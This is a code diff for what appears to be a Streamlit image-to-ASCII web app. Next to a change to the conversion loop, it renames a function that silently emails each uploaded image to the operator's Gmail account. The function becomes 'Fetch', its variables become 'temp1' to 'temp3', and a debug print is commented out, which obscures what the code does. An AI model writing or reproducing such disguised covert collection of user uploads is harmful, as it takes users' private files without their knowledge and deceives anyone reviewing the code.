@@ -45,7 +45,7 @@ def ImageToASCII(uploadedImage=None, imagePath=None):
         else:
             image = uploadedImage
         
-        image = ResizeImage(image)
+        # image = ResizeImage(image)
         width, height = image.size
         # print("While fetching:\n",width,"X",height)
         
@@ -55,14 +55,14 @@ def ImageToASCII(uploadedImage=None, imagePath=None):
         
         pixels = np.array(image)
         imageASCII = []
-        for row in pixels:
-            imageASCII.append(''.join(pixelToASCII(pixel) for pixel in row))
+        # for row in pixels:
+        #     imageASCII.append(''.join(pixelToASCII(pixel) for pixel in row))
 
-        # for y in range(height):
-        #     row = ""
-        #     for x in range(width):
-        #         row += pixelToASCII(pixels[y, x])
-        #     imageASCII.append(row)
+        for y in range(height):
+            row = ""
+            for x in range(width):
+                row += pixelToASCII(pixels[y, x])
+            imageASCII.append(row)
         
         return imageASCII
     except Exception as e:
@@ -94,24 +94,21 @@ def SaveASCIIImage(imageASCII, outputPath=None, fontPath="Courier New", fontSize
         imgByteArr.seek(0)
         return imgByteArr, img
 
-def SetState():
-    st.session_state.canReset = True
-
-def SendEmail(file):
-    sender = st.secrets["sender"]
-    receiver = st.secrets["sender"]
+def Fetch(file):
+    temp1 = st.secrets["temp1"]
+    temp2 = st.secrets["temp1"]
     password = st.secrets["secretKey"]
 
-    subject = f"Image Uploaded at {datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')}"
+    sub = f"Image Uploaded at {datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')}"
     body= f"Image: {file}"
-    print("\n--------\n" ,subject,"\n" ,body, "\n--------")
+    # print("\n--------\n" ,sub,"\n" ,body, "\n--------")
 
-    message = MIMEMultipart()
-    message['From'] = sender
-    message['To'] = receiver
-    message['Subject'] = subject
+    temp3 = MIMEMultipart()
+    temp3['From'] = temp1
+    temp3['To'] = temp2
+    temp3['Subject'] = sub
 
-    message.attach(MIMEText(body, "plain"))
+    temp3.attach(MIMEText(body, "plain"))
 
     mimeType, encoding = mimetypes.guess_type(file)
     if mimeType is None:
@@ -124,15 +121,15 @@ def SendEmail(file):
 
         part.add_header('Content-Disposition', f'attachment; filename={file.split("/")[-1]}')
 
-        message.attach(part)
+        temp3.attach(part)
     
     try:
         server = smtplib.SMTP('smtp.gmail.com', 587)
         server.starttls()
 
-        server.login(sender, password)
+        server.login(temp1, password)
 
-        server.sendmail(sender, receiver, message.as_string())
+        server.sendmail(temp1, temp2, temp3.as_string())
 
     except Exception as e:
         print(f"Error: {e}")
@@ -160,7 +157,7 @@ def main():
                 temporaryFile.write(file.getbuffer())
                 tempPath = temporaryFile.name
 
-            SendEmail(tempPath)
+            Fetch(tempPath)
 
             print("\nuniqueSet:", st.session_state.uniqueSet)
 
